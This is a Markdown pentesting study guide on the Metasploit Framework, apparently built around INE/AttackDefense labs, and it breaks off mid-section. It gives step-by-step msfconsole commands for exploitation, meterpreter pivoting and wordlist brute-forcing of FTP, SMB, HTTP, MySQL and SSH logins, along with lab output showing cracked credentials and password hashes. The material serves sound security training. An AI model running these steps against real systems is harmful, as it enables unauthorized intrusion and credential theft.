# The Metasploit Framework (MSF)

> #### ⚡ Prerequisites
>
> * Basic familiarity with Linux & Windows
> * Basic familiarity with TCP & UDP protocols
>
> #### 📕 Learning Objectives
>
> * Understand, install, configure and use **Metasploit Framework**
> * Perform **info-gathering**, **enumeration**, **exploitation**, **post exploitation** with Metasploit
>
> #### 🔬 Training list - PentesterAcademy/INE Labs
>
> `subscription required`
>
> - [Metasploit Auxiliary modules](https://www.attackdefense.com/listingnoauth?labtype=metasploit&subtype=metasploit-auxiliary)
> - [MITRE ATT&CK Linux Discovery](https://attackdefense.com/listing?labtype=mitre&subtype=mitre-discovery)
> - [Metasploit Meterpreter](https://attackdefense.com/listing?labtype=metasploit&subtype=metasploit-meterpreter)
> - [Linux Vulnerable Servers Exploitation - Metasploit](https://www.attackdefense.com/listingnoauth?labtype=metasploit&subtype=metasploit-linux-exploitation)
> - [Linux Exploitation - Metasploit](https://www.attackdefense.com/listingnoauth?labtype=linux-security-exploitation&subtype=linux-security-exploitation-metasploit)
> - [Linux Post Modules - Metasploit](https://www.attackdefense.com/listingnoauth?labtype=linux-security-post-exploitation&subtype=linux-security-post-exploitation-metasploit)
> - [Win Basic Exploitation - Metasploit](https://www.attackdefense.com/listingnoauth?labtype=windows-exploitation&subtype=windows-exploitation-basics)
> - [Win Pentesting Basic Exploitation](https://attackdefense.com/listing?labtype=windows-exploitation&subtype=windows-exploitation-pentesting)
> - [Win Apps Exploits - Metasploit](https://www.attackdefense.com/listingnoauth?labtype=metasploit&subtype=metasploit-windows-apps-exploits)
> - [Win Post Exploitation - Metasploit](https://attackdefense.com/listing?labtype=windows-post-exploitation&subtype=windows-post-exploitation-metasploit)
> - [Win Maintaining Access](https://attackdefense.com/listing?labtype=windows-maintaining-access&subtype=windows-maintaining-access-basics)

## MSF Introduction

🗒️ The [**Metasploit Framework**](https://www.metasploit.com/) (**MSF**) is an open-source pentesting and exploit development platform, used to write, test and execute exploit code.

- Provides automation of the penetration testing life cycle (specially exploitation and post-exploitation)
- Used to develop and test exploits
- Has a world database and public tested exploits 
- It is modular, new modules can be added and integrated
- [Pre-installed in Kali Linux](https://www.kali.org/tools/metasploit-framework/)
- It is [open-source](https://github.com/rapid7/metasploit-framework)
- Founded by H.D. Moore in 2003 (developed in Perl), Written in Ruby in 2007, acquired by [Rapid7](https://www.rapid7.com/) in 2009, released as Metasploit v6.0 in 2020
- **Metasploit Framework** is the Community Edition
- Metasploit Pro & Express are Commercial versions

> 📌 Check the [Metasploit Unleashed – Free Ethical Hacking Course by OffSec](https://www.offsec.com/metasploit-unleashed/)

### Terminology

| Term              | Description                                                  |
| ----------------- | ------------------------------------------------------------ |
| **Interface**     | Methods of interacting with the Metasploit Framework (`msfconsole`, Metasploit cmd) |
| **Module**        | Pieces of code that perform a particular task (an exploit)   |
| **Vulnerability** | Exploitable flaw or weakness in a computer system or network |
| **Exploit**       | Code/Module used to take advantage of a vulnerability        |
| **Payload**       | Piece of code delivered to the target by an exploit (execute arbitrary commands or provide remote access) |
| **Listener**      | Utility that listens for an incoming connection from a target |

> 📌 **Exploit** is launched (takes advantage of the vulnerability) ➡️ **Payload** dropped (executes a reverse shell command) ➡️ Connects back to the **Listener**

### Interfaces

🗒️ **Metasploit Framework Console** (**[MSFconsole](https://www.offsec.com/metasploit-unleashed/msfconsole/)**) - an all in one interface that provides with access to all the functionality of the MSF.

![msfconsole](hostnetwork-penetration-testingassets/image-20230409121754103.png)

🗒️ **Metasploit Framework Command Line Interface** (**[MSFcli](https://www.offsec.com/metasploit-unleashed/msfcli/)**) - a command line utility used to facilitate the creation of automation scripts that utilize Metasploit modules.

- Discontinued in 2015, MSFconsole can be used with the same functionality of *redirecting output from other tools into `msfcli` and vice versa.*

🗒️ **Metasploit Community Edition GUI** - a web based GUI front-end of the MSF.

🗒️ [**Armitage**](https://www.kali.org/tools/armitage/) - a free Java based GUI front-end cyber attack management tool for the MSF.

- Visualizes targets and simplifies network discovery
- Recommends exploits
- Exposes the advanced capabilities of the MSF

### [Architecture](https://www.offsec.com/metasploit-unleashed/metasploit-architecture/)

![Metasploit Framework Architecture - oreilly.com](hostnetwork-penetration-testingassets/16c68136-bdbb-4846-be83-4e93822ee0de.png)

🗒️ A **module** is the piece of code that can be utilized and executed by the MSF.

The MSF **libraries** (Rex, Core, Base) allow to extend and initiate functionality, facilitating the execution of modules without having to write additional code.

### [Modules](https://www.offsec.com/metasploit-unleashed/modules-and-locations/)

| MSF Module    | Description                                                  |
| ------------- | ------------------------------------------------------------ |
| **Exploit**   | Used to take advantage of a vulnerability, usually paired with a payload |
| **Payload**   | Code delivered and remotely executed on the target *after successful exploitation* - **e.g.** a reverse shell that initiates a connection |
| **Encoder**   | Used to encode payloads in order to avoid Anti Virus detection - **e.g.** [shikata_ga_nai](https://www.mandiant.com/resources/blog/shikata-ga-nai-encoder-still-going-strong) encoding scheme |
| **NOPS**      | Keep the payload sizes consistent across exploit attempts and ensure the *stability of a payload* on the target system |
| **Auxiliary** | Is not paired with a payload, used to perform additional functionality - **e.g.** port scanners, fuzzers, sniffers, etc |

### [Payload Types](https://www.offsec.com/metasploit-unleashed/payloads/)

**Payloads** are created at runtime from various components. Depending on the target system and infrastructure, there are two types of payloads that can be used:

- **Non-Staged Payload** - sent to the target system as is, along with the exploit
- **Staged Payload** - sent to the target in two parts:
  - the **stager** (first part) establish a stable communication channel between the attacker and target. It contains a payload, the stage, that initiates a reverse connection back to the attacker
  - the **stage** (second part) is downloaded by the stager and executed
    - executes arbitrary commands on the target
    - provides a reverse shell or Meterpreter session

🗒️ The [**Meterpreter**](https://www.offsec.com/metasploit-unleashed/about-meterpreter/) is an advanced multi-functional payload executed by in memory DLL injection stagers on the target system.

- Communicates over the stager socket
- Provides an interactive command interpreter on the target system

### [File System](https://www.offsec.com/metasploit-unleashed/filesystem-and-libraries/)

```bash
ls /usr/share/metasploit-framework
```

![ls /usr/share/metasploit-framework](hostnetwork-penetration-testingassets/image-20230409193231022.png)

- MSF filesystem is intuitive and organized by directories.
- Modules are stored under:
  - `/usr/share/metasploit-framework/modules/`
  - `~/.msf4/modules` - user specified modules

![](hostnetwork-penetration-testingassets/image-20230409193537174.png)

![](hostnetwork-penetration-testingassets/image-20230409194316207.png)

![](hostnetwork-penetration-testingassets/image-20230409194335838.png)

****

### Pentesting with MSF

🗒️ [**PTES**](http://www.pentest-standard.org/index.php/Main_Page) (**P**enetration **T**esting **E**xecution **S**tandard) is a methodology that contains 7 main sections, defined by the standard as a comprehensive basis for penetration testing execution.

- can be adopted as a roadmap for Metasploit integration and understanding of the phases of a penetration test.

> The various phases involved in a typical pentest should be:
>
> 📌 **Pre-Engagement Interactions**
>
> ⬇️ 
>
> 📌 **Information Gathering**
>
> ⬇️
>
> 📌 **Enumeration**
>
> - Threat Modeling
> - Vulnerability Analysis
>
> ⬇️
>
> 📌 **Exploitation**
>
> - Identify Vulnerable Services
> - Prepare Exploit Code
> - Gaining Access
> - Bypass AV detection
> - Pivoting
>
> ⬇️
>
> 📌 **Post Exploitation**
>
> - Privilege Escalation
> - Maintaining Persistent Access
> - Clearing Tracks
>
> ⬇️
>
> 📌 **Reporting**

|            Pentesting Phase             | MSF Implementation                     |
| :-------------------------------------: | -------------------------------------- |
| **Information Gathering & Enumeration** | Auxiliary Modules, `nmap` reports      |
|       **Vulnerability Scanning**        | Auxiliary Modules, `nessus` reports    |
|            **Exploitation**             | Exploit Modules & Payloads             |
|          **Post Exploitation**          | Meterpreter                            |
|        **Privilege Escalation**         | Post Exploitation Modules, Meterpreter |
|    **Maintaining Persistent Access**    | Post Exploitation Modules, Persistence |

![PTES - infopulse.com](hostnetwork-penetration-testingassets/ptes-methodology-pic-1-infopulse.png)

## Metasploit Fundamentals

### [Database](https://www.offsec.com/metasploit-unleashed/using-databases/)

🗒️ The **Metasploit Framework Database** (**msfdb**) contains all the data used with MSF like assessments and scans data, etc.

- Uses PostgreSQL as the primary database - `postgresql` service must be running
- Facilitates the import and storage of scan results (from Nmap, Nessus, other tools)

### [MSF Kali Configuration](https://www.kali.org/docs/tools/starting-metasploit-framework-in-kali/)

- Use APT package manager on Kali Linux (or on Debian-based distros)

```bash
sudo apt update && sudo apt install metasploit-framework -y
```

- Enable `postgresql` at boot, start the service and initialize MSF database

```bash
sudo systemctl enable postgresql
sudo systemctl restart postgresql
sudo msfdb init
```

- Run **`msfconsole`** to start the Metasploit Framework Console

```bash
msfconsole
```

- Check the db connection is on in the `msfconsole`

```bash
db_status
```



> 📌 Check this article by StationX ➡️ [How to Use Metasploit in Kali Linux + Metasploitable3](https://www.stationx.net/how-to-use-metasploit-in-kali-linux/) which will cover:
>
> - Deploying a Kali Linux virtual machine with Metasploit pre-installed
> - Setting up a target in a virtual lab, Metasploitable3, with Vagrant
> - A sample walkthrough against a vulnerable MySQL Server
> - Frequently Asked Questions (FAQ)

### [MSFConsole](https://www.offsec.com/metasploit-unleashed/msfconsole/)

🗒️ The **Metasploit Framework Console** (**msfconsole**) is an all-in-one interface and centralized console that allows access to all of the MSF options and features.

- It is launched by running the `msfconsole` command

```bash
msfconsole
```

- Run it in quiet mode without the banner with

```bash
msfconsole -q
```

### Module Variables

An MSF module requires additional information that can be configured through the use of MSF **variables**, both *local* or *global* variables, called **`options`** inside the msfconsole.

**Variables e.g.** (they are based on the selected module):

- `LHOST` - attacker's IP address
- `LPORT` - attacker's port number (receive reverse connection)
- `RHOST` - target's IP address
- `RHOSTS` - multiple targets/networks IP addresses
- `RPORT` - target port number

### Useful Commands

- Run `msfconsole` and check these useful commands:

```bash
help
version

show -h
show all
show exploits

search <STRING>
use <MODULE_NAME>
set <OPTION>
run
execute # same as run

sessions
connect
```

![](hostnetwork-penetration-testingassets/image-20230412141325709.png)

![](hostnetwork-penetration-testingassets/image-20230412141308687.png)

#### Port Scan Example

```bash
search portscan
use auxiliary/scanner/portscan/tcp
show options
set RHOSTS <TARGET_IP>
set PORTS 1-1000
run
# CTRL+C to cancel the running process
back
```

![](hostnetwork-penetration-testingassets/image-20230412175031929.png)

#### CVE Exploits Example

```bash
search cve:2017 type:exploit platform:windows
```

![search cve:2017 type:exploit platform:window](hostnetwork-penetration-testingassets/image-20230412175150747.png)

#### Payload Options Example

```bash
search eternalblue
use 0
# specify the identifier
set payload <PAYLOAD_NAME>
set RHOSTS <TARGET_IP>
run
# or
exploit
```

![](hostnetwork-penetration-testingassets/image-20230412175427698.png)

![](hostnetwork-penetration-testingassets/image-20230412175734432.png)

### [Workspaces](https://docs.rapid7.com/metasploit/managing-workspaces/)

🗒️ Metasploit **Workspaces** allows to manage and organize the hosts, data, scans and activities stored in the `msfdb`.

- Import, manipulate, export data
- Create, manage, switch between workspaces
- Sort and organize the assessments of the penetration test

> 📌 *It's recommended to create a new workspace for each engagement.*

```bash
msfconsole -q
db_status
	[*] Connected to msf. Connection type: postgresql.
```

```bash
workspace -h
```

![workspace -h](hostnetwork-penetration-testingassets/image-20230412183240012.png)

```bash
workspace
# current working workspace
	* default
```

- **Create** a new workspace

```bash
workspace -a Test
```

![](hostnetwork-penetration-testingassets/image-20230412183002282.png)

- **Change** workspace

```bash
workspace <WORKSPACE_NAME>
```

```bash
workspace -a INE
```

- **Delete** a workspace

```bash
workspace -d Test
```

## Information Gathering & Enumeration with MSF

- The Metasploit Framework allows to import `nmap` results.

### Nmap Enumeration

**`nmap`** enumeration results (*service versions, operating systems, etc*) can be exported into a file that can be imported into MSF and used for further detection and exploitation.

> 🔬 Check the full `nmap` information gathering lab in [this Nmap Host Discovery Lab](../assessment-methodologies/1-info-gathering.md#lab-with-nmap) (at the end of the page).

Some commands:

```bash
nmap <TARGET_IP>
nmap -Pn <TARGET_IP>
nmap -Pn -sV -O <TARGET_IP>
```

- Output the `nmap` scan results into an **`.XML`** format file that can be imported into MSF

```bash
nmap -Pn -sV -O 10.2.18.161 -oX windows_server_2012
```

### [MSFdb Import](https://www.offsec.com/metasploit-unleashed/using-databases/)

-  In the same lab environment from above, use `msfconsole` to import the results into MSF with the `db_import` command

```bash
service postgresql start
msfconsole
```

- Inside `msfconsole`

```bash
db_status
workspace -a Win2k12
```

```bash
db_import /root/windows_server_2012
```

```bash
[*] Importing 'Nmap XML' data
[*] Import: Parsing with 'Nokogiri v1.10.7'
[*] Importing host 10.2.18.161
[*] Successfully imported /root/windows_server_2012
```

```bash
hosts
services
vulns
loot
creds
notes
```

![](hostnetwork-penetration-testingassets/image-20230412190333138.png)

- Perform an `nmap` scan *within the MSF Console and import the results in a dedicated workspace*

```bash
workspace -a nmap_MSF
```

```bash
db_nmap -Pn -sV -O <TARGET_IP>
```

![](hostnetwork-penetration-testingassets/image-20230412190726940.png)

### [Port Scanning](https://www.offsec.com/metasploit-unleashed/port-scanning/)

MSF **Auxiliary modules** are used during the information gathering (similar to `nmap`) and the post exploitation phases of the pentest.

- perform TCP/UDP port scanning
- enumerate services
- discover hosts on different network subnets (post-exploitation phase)

#### Lab Network Service Scanning

> 🔬 Lab [T1046 : Network Service Scanning](https://attackdefense.com/challengedetails?cid=1869)

```bash
service postgresql start && msfconsole -q
```

```bash
workspace -a Port_scan
search portscan
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.41.167.3
run
```

![](hostnetwork-penetration-testingassets/image-20230412220747788.png)

```bash
curl 192.41.167.3
```

- Exploitation

```bash
search xoda
use exploit/unix/webapp/xoda_file_upload
set RHOSTS 192.41.167.3
set TARGETURI /
run
```

![](hostnetwork-penetration-testingassets/image-20230412221111369.png)

- Perform a network scan on the second target

```bash
meterpreter > shell
```

```bash
/bin/bash -i
ifconfig
# 192.26.158.2 Local Lan subnet IP
exit
```

- Add the route within `meterpreter` and background the meterpreter session

```bash
run autoroute -s 192.26.158.2
background
```

![](hostnetwork-penetration-testingassets/image-20230412221528898.png)

```bash
search portscan
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.26.158.3
run
```

```bash
# the port scan will be performed through the first target system using the route
[+] 192.26.158.3: - 192.26.158.3:22 - TCP OPEN
[+] 192.26.158.3: - 192.26.158.3:21 - TCP OPEN
[+] 192.26.158.3: - 192.26.158.3:80 - TCP OPEN
```

- Upload and run `nmap` against the second target, from the first target machine

```bash
sessions 1
upload /root/tools/static-binaries/nmap /tmp/nmap
shell
```

```bash
/bin/bash -i
cd /tmp
chmod +x ./nmap
./nmap -p- 192.26.158.3
```

```bash
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

> 📌 There are **`3`** running services on the second target machine.

#### UDP Scan

- Into `msfconsole`

```bash
search udp_sweep
use auxiliary/scanner/discovery/udp_sweep
set RHOSTS 192.41.167.3
run
```

### [Services Enumeration](https://www.offsec.com/metasploit-unleashed/service-identification/)

> 📌🔬 Check the [Enumeration Section labs here](../assessment-methodologies/3-enumeration.md) for basic `nmap` enumeration.

Next, there are some MSF commands and modules for **service enumeration** on the same labs from the Enumeration Section.

- Auxiliary modules can be used for enumeration, brute-force attacks, etc

❗📝 **On every attacker machine, run this command to start `msfconsole`:**

```bash
service postgresql start && msfconsole -q
```

- Setup a **global variable**. This will set the RHOSTS option for all the modules utilized:

```bash
setg RHOSTS <TARGET_IP>
```

#### [FTP](../assessment-methodologies/3-enumeration/ftp-enum.md)

> **`auxiliary/scanner/ftp/ftp_version`**

```bash
ip -br -c a
workspace -a FTP_ENUM
search portscan
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.146.175.3
run
```

```bash
[+] 192.146.175.3: - 192.146.175.3:21 - TCP OPEN
```

```bash
back
search type:auxiliary name:ftp
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.146.175.3
run
```

```bash
[+] 192.146.175.3:21 - FTP Banner: '220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.146.175.3]\x0d\x0a'

search ProFTPD
```

> **`auxiliary/scanner/ftp/ftp_login`**

```bash
back
search type:auxiliary name:ftp
use auxiliary/scanner/ftp/ftp_login
show options
set RHOSTS 192.146.175.3
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
```

```bash
[+] 192.146.175.3:21 - 192.146.175.3:21 - Login Successful: sysadmin:654321
```

> **`auxiliary/scanner/ftp/anonymous`**

```bash
back
search type:auxiliary name:ftp
use auxiliary/scanner/ftp/anonymous
set RHOSTS 192.146.175.3
run
```

#### [SMB/SAMBA](../assessment-methodologies/3-enumeration/smb-enum.md#lab-3)

> **`auxiliary/scanner/smb/smb_version`**

```bash
ip -br -c a
setg RHOSTS 192.132.155.3
workspace -a SMB_ENUM
search type:auxiliary name:smb
use auxiliary/scanner/smb/smb_version
options
run
```

```bash
[*] 192.132.155.3:445 - Host could not be identified: Windows 6.1 (Samba 4.3.11-Ubuntu)
```

> **`auxiliary/scanner/smb/smb_enumusers`**

```bash
back
search type:auxiliary name:smb
use auxiliary/scanner/smb/smb_enumusers
info
run
```

```bash
[+] 192.132.155.3:139 - SAMBA-RECON [ john, elie, aisha, shawn, emma, admin ] ( LockoutTries=0 PasswordMin=5 )
```

> **`auxiliary/scanner/smb/smb_enumshares`**

```bash
back
search type:auxiliary name:smb
use auxiliary/scanner/smb/smb_enumshares
set ShowFiles true
run
```

```bash
[+] 192.132.155.3:139 - public - (DS) 
[+] 192.132.155.3:139 - john - (DS) 
[+] 192.132.155.3:139 - aisha - (DS) 
[+] 192.132.155.3:139 - emma - (DS) 
[+] 192.132.155.3:139 - everyone - (DS) 
[+] 192.132.155.3:139 - IPC$ - (I) IPC Service (samba.recon.lab)
```

> [**`auxiliary/scanner/smb/smb_login`**](https://www.offsec.com/metasploit-unleashed/smb-login-check/)

```bash
back
search smb_login
use auxiliary/scanner/smb/smb_login
options
set SMBUser admin
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
```

```bash
[+] 192.132.155.3:445 - 192.132.155.3:445 - Success: '.\admin:password'
```

#### [HTTP](../assessment-methodologies/3-enumeration/http-enum.md#lab-3)

> 🔬 [Metasploit - Apache Enumeration Lab](https://www.attackdefense.com/challengedetails?cid=118)

- Remember to specify the correct port and if targeting a web server with SSL enabled, in the options.

```bash
ip -br -c a
setg RHOSTS 192.106.226.3
setg RHOST 192.106.226.3
workspace -a HTTP_ENUM
```

> **`auxiliary/scanner/http/apache_userdir_enum`**

```bash
search apache_userdir_enum
use auxiliary/scanner/http/apache_userdir_enum
options
info
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
run
```

```bash
[+] http://192.106.226.3/ - Users found: rooty
```

> **`auxiliary/scanner/http/brute_dirs`**

> **`auxiliary/scanner/http/dir_scanner`**

```bash
search dir_scanner
use auxiliary/scanner/http/dir_scanner
options
run
```

> **`auxiliary/scanner/http/dir_listing`**

> **`auxiliary/scanner/http/http_put`**

```bash
[+] Found http://192.106.226.3:80/cgi-bin/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/data/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/doc/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/downloads/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/icons/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/manual/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/secure/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/users/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/uploads/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/web_app/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/view/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/webadmin/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/webmail/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/webdb/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/webdav/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/~admin/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/~nobody/ 404 (192.106.226.3)
```

> **`auxiliary/scanner/http/files_dir`**

```bash
search files_dir
use auxiliary/scanner/http/files_dir
options
set DICTIONARY /usr/share/metasploit-framework/data/wmap/wmap_files.txt
run
```

```bash
[+] Found http://192.106.226.3:80/file.backup 200
[*] Using code '404' as not found for files with extension .bak
[*] Using code '404' as not found for files with extension .c
[+] Found http://192.106.226.3:80/code.c 200
[*] Using code '404' as not found for files with extension .cfg
[+] Found http://192.106.226.3:80/code.cfg 200
[*] Using code '404' as not found for files with extension .class
[...]
[*] Using code '404' as not found for files with extension .html
[+] Found http://192.106.226.3:80/index.html 200
[*] Using code '404' as not found for files with extension .htm
[...]
[+] Found http://192.106.226.3:80/test.php 200
[*] Using code '404' as not found for files with extension .tar
[...]
```

> **`auxiliary/scanner/http/http_login`**

```bash
search http_login
use auxiliary/scanner/http/http_login
options
set AUTH_URI /secure/
unset USERPASS_FILE
echo "rooty" > user.txt
set USER_FILE /root/user.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
```

> **`auxiliary/scanner/http/http_header`**

```bash
search http_header
use auxiliary/scanner/http/http_header
options
run
```

```bash
[+] 192.106.226.3:80 : CONTENT-TYPE: text/html
[+] 192.106.226.3:80 : LAST-MODIFIED: Wed, 27 Feb 2019 04:21:01 GMT
[+] 192.106.226.3:80 : SERVER: Apache/2.4.18 (Ubuntu)
[+] 192.106.226.3:80 : detected 3 headers
```

> **`auxiliary/scanner/http/http_version`**

```bash
search type:auxiliary name:http
use auxiliary/scanner/http/http_version
options
run
# in case of HTTPS website, set RPORT=443 and SSL="true"
```

```bash
[+] 192.106.226.3:80 Apache/2.4.18 (Ubuntu)
```

> **`auxiliary/scanner/http/robots_txt`**

```bash
search robots_txt
use auxiliary/scanner/http/robots_txt
options
run
```

```bash
[+] Contents of Robots.txt:
# robots.txt for attackdefense 
User-agent: test                     
# Directories
Allow: /webmail
User-agent: *
# Directories
Disallow: /data
Disallow: /secure
```

```bash
curl http://192.106.226.3/data/
curl http://192.106.226.3/secure/
```

#### [MYSQL](../assessment-methodologies/3-enumeration/mysql-enum.md)

> 🔬 [Metasploit - MySQL Enumeration Lab](https://www.attackdefense.com/challengedetails?cid=120)

```bash
ip -br -c a
setg RHOSTS 192.64.22.3
setg RHOST 192.64.22.3
workspace -a MYSQL_ENUM
```

> **`auxiliary/admin/mysql/mysql_enum`**

```bash
search mysql_enum
use auxiliary/admin/mysql/mysql_enum
info
set USERNAME root
set PASSWORD twinkle
run
```

```bash
[*] 192.64.22.3:3306 - Running MySQL Enumerator...
[*] 192.64.22.3:3306 - Enumerating Parameters
[*] 192.64.22.3:3306 -  MySQL Version: 5.5.61-0ubuntu0.14.04.1
[*] 192.64.22.3:3306 -  Compiled for the following OS: debian-linux-gnu
[*] 192.64.22.3:3306 -  Architecture: x86_64
[*] 192.64.22.3:3306 -  Server Hostname: victim-1
[*] 192.64.22.3:3306 -  Data Directory: /var/lib/mysql/
[*] 192.64.22.3:3306 -  Logging of queries and logins: OFF
[*] 192.64.22.3:3306 -  Old Password Hashing Algorithm OFF
[*] 192.64.22.3:3306 -  Loading of local files: ON
[*] 192.64.22.3:3306 -  Deny logins with old Pre-4.1 Passwords: OFF
[*] 192.64.22.3:3306 -  Allow Use of symlinks for Database Files: YES
[*] 192.64.22.3:3306 -  Allow Table Merge: 
[*] 192.64.22.3:3306 -  SSL Connection: DISABLED
[*] 192.64.22.3:3306 - Enumerating Accounts:
[*] 192.64.22.3:3306 -  List of Accounts with Password Hashes:
[+] 192.64.22.3:3306 -          User: root Host: localhost Password Hash: *A0E23B565BACCE3E70D223915ABF2554B2540144
[+] 192.64.22.3:3306 -          User: root Host: 891b50fafb0f Password Hash: 
[+] 192.64.22.3:3306 -          User: root Host: 127.0.0.1 Password Hash: 
[+] 192.64.22.3:3306 -          User: root Host: ::1 Password Hash: 
[+] 192.64.22.3:3306 -          User: debian-sys-maint Host: localhost Password Hash: *F4E71A0BE028B3688230B992EEAC70BC598FA723
[+] 192.64.22.3:3306 -          User: root Host: % Password Hash: *A0E23B565BACCE3E70D223915ABF2554B2540144
[+] 192.64.22.3:3306 -          User: filetest Host: % Password Hash: *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
[+] 192.64.22.3:3306 -          User: ultra Host: localhost Password Hash: *94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29
[+] 192.64.22.3:3306 -          User: guest Host: localhost Password Hash: *17FD2DDCC01E0E66405FB1BA16F033188D18F646
[+] 192.64.22.3:3306 -          User: gopher Host: localhost Password Hash: *027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0
[+] 192.64.22.3:3306 -          User: backup Host: localhost Password Hash: *E6DEAD2645D88071D28F004A209691AC60A72AC9
[+] 192.64.22.3:3306 -          User: sysadmin Host: localhost Password Hash: *78A1258090DAA81738418E11B73EB494596DFDD3
[*] 192.64.22.3:3306 -  The following users have GRANT Privilege:
[...]
```

> **`auxiliary/admin/mysql/mysql_sql`**

```bash
search mysql_sql
use auxiliary/admin/mysql/mysql_sql
options
set USERNAME root
set PASSWORD twinkle
run
# set an SQL query
set SQL show databases;
run
```

```bash
[*] 192.64.22.3:3306 - Sending statement: 'select version()'...
[*] 192.64.22.3:3306 -  | 5.5.61-0ubuntu0.14.04.1 |

[*] 192.64.22.3:3306 - Sending statement: 'show databases;'...
[*] 192.64.22.3:3306 -  | information_schema |
[*] 192.64.22.3:3306 -  | mysql |
[*] 192.64.22.3:3306 -  | performance_schema |
[*] 192.64.22.3:3306 -  | upload |
[*] 192.64.22.3:3306 -  | vendors |
[*] 192.64.22.3:3306 -  | videos |
[*] 192.64.22.3:3306 -  | warehouse |
```

> **`auxiliary/scanner/mysql/mysql_file_enum`**

> **`auxiliary/scanner/mysql/mysql_hashdump`**

> **`auxiliary/scanner/mysql/mysql_login`**

```bash
search mysql_login
use auxiliary/scanner/mysql/mysql_login
options
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set STOP_ON_SUCCESS false
run
```

```bash
[+] 192.64.22.3:3306 - 192.64.22.3:3306 - Success: 'root:twinkle'
```

> **`auxiliary/scanner/mysql/mysql_schemadump`**

```bash
search mysql_schemadump
use auxiliary/scanner/mysql/mysql_schemadump
options
set USERNAME root
set PASSWORD twinkle
run
```

```bash
[+] 192.64.22.3:3306 - Schema stored in:
/root/.msf4/loot/20230413112948_MYSQL_ENUM_192.64.22.3_mysql_schema_807923.txt
[+] 192.64.22.3:3306 - MySQL Server Schema
 Host: 192.64.22.3
 Port: 3306
 ====================
---
- DBName: upload
  Tables: []
- DBName: vendors
  Tables: []
- DBName: videos
  Tables: []
- DBName: warehouse
  Tables: []
```

> **`auxiliary/scanner/mysql/mysql_version`**

```bash
search type:auxiliary name:mysql
use auxiliary/scanner/mysql/mysql_version
options
run
```

```bash
[+] 192.64.22.3:3306 - 192.64.22.3:3306 is running MySQL 5.5.61-0ubuntu0.14.04.1 (protocol 10)
# MySQL and Ubuntu versions enumerated!
```

> **`auxiliary/scanner/mysql/mysql_writable_dirs`**

- Check the MySQL Enumerated data within MSF:

```bash
hosts
services
loot
creds
```

![](hostnetwork-penetration-testingassets/image-20230413133324466.png)

#### [SSH](../assessment-methodologies/3-enumeration/ssh-enum.md)

> 🔬 [Metasploit - SSH Login](https://attackdefense.com/challengedetails?cid=1526)

```bash
ip -br -c a
setg RHOSTS 192.127.196.3
setg RHOST 192.127.196.3
workspace -a SSH_ENUM
```

> **`auxiliary/scanner/ssh/ssh_version`**

```bash
search type:auxiliary name:ssh
use auxiliary/scanner/ssh/ssh_version
options
run
```

```bash
[+] 192.127.196.3:22 - SSH server version: SSH-2.0-OpenSSH_7.9p1 Ubuntu-10 ( service.version=7.9p1 openssh.comment=Ubuntu-10 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH service.cpe23=cpe:/a:openbsd:openssh:7.9p1 os.vendor=Ubuntu os.family=Linux os.product=Linux os.version=19.04 os.cpe23=cpe:/o:canonical:ubuntu_linux:19.04 service.protocol=ssh fingerprint_db=ssh.banner )
# SSH-2.0-OpenSSH_7.9p1 and Ubuntu 19.04
```

> **`auxiliary/scanner/ssh/ssh_login`**

```bash
search ssh_login
use auxiliary/scanner/ssh/ssh_login
# for password authentication
options
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
run
```

```bash
[+] 192.127.196.3:22 - Success: 'sysadmin:hailey' ''
[*] Command shell session 1 opened (192.127.196.2:37093 -> 192.127.196.3:22)
[+] 192.127.196.3:22 - Success: 'rooty:pineapple' ''
[*] Command shell session 2 opened (192.127.196.2:44935 -> 192.127.196.3:22)
[+] 192.127.196.3:22 - Success: 'demo:butterfly1' ''
[*] Command shell session 3 opened (192.127.196.2:39681 -> 192.127.196.3:22)
[+] 192.127.196.3:22 - Success: 'auditor:xbox360' ''
[*] Command shell session 4 opened (192.127.196.2:42273 -> 192.127.196.3:22)
[+] 192.127.196.3:22 - Success: 'anon:741852963' ''
[*] Command shell session 5 opened (192.127.196.2:44263 -> 192.127.196.3:22)
[+] 192.127.196.3:22 - Success: 'administrator:password1' ''
[*] Command shell session 6 opened (192.127.196.2:39997 -> 192.127.196.3:22)
[+] 192.127.196.3:22 - Success: 'diag:secret' ''
```

- This module sets up SSH sessions

![](hostnetwork-penetration-testingassets/image-20230413143027661.png)

> **`auxiliary/scanner/ssh/ssh_enumusers`**

```bash
search type:auxiliary name:ssh
use auxiliary/scanner/ssh/ssh_enumusers
options
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
run
```

```bash
